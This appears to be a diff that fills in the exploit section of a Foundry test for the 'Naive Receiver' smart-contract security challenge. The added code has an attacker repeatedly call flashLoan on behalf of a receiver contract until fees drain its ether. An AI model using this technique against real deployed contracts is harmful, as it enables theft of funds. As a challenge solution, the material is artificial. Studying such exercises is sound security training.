@@ -49,7 +49,11 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        while (1 ether <= address(flashLoanReceiver).balance) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
